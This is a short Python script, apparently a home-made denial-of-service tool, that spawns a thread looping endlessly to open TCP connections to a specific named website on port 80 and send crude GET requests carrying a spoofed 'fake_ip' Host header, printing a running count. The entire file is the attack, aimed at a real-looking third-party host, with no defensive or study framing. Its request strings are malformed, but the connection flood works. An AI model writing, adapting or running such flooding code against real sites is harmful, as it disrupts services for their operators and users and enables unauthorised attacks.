import threading
import socket

target = "www.bullcurency.com"
port = 80
fake_ip = "182.21.20.32"

allready_connected = 0

print("todo funca")


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),
                 (target, port))
        s.sendto(
            ("Host: " + fake_ip + "HTTP/1.1\r\n\r\n").encode("ascii"), (target, port))
        s.close()
        global allready_connected
        allready_connected += 1
        print(allready_connected)


for i in range(1):
    thread = threading.Thread(target=attack)
    thread.start()
